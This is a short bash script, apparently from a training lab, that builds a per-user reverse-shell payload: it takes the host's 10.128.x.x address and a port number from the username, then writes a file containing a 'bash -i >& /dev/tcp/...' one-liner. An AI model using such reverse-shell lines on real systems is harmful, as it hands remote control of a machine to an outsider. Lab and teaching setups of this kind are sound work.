#!/bin/bash
# Used to create a bash reverse shell where usernames were created to reflect a port number. For example user p4401 would have access to port 4401. Also assumes
# the host IP is 10.128.x.x.
#
i=$(ifconfig ens4|grep inet|cut -d "i" -f2|cut -d " " -f2|grep 10.128)
p=$(whoami|cut -d "p" -f2)
echo "bash -i >& /dev/tcp/$i/$p 0>&1" > $p.sh
